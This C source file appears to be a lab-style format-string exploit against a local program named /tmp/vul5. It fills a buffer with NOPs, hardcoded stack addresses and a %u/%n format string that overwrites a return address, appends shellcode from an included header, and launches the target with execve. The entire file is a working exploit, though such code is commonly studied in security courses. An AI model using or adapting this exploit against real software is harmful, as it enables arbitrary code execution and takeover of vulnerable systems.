#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
  char pl[400];
  memset(pl, 0x90, 400);
  pl[399] = '\0';
  char *format = 
    "\xff\xff\xff\xff\x30\xfb\xff\xbf"
    "\xff\xff\xff\xff\x31\xfb\xff\xbf"
    "\xff\xff\xff\xff\x32\xfb\xff\xbf"
    "\xff\xff\xff\xff\x33\xfb\xff\xbf"
    "%66u%n%157u%n%256u%n%192u%n";
  memcpy(pl, format, strlen(format));
  memcpy(pl + 398 - strlen(shellcode), shellcode, strlen(shellcode));

  char *args[] = { TARGET, pl, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
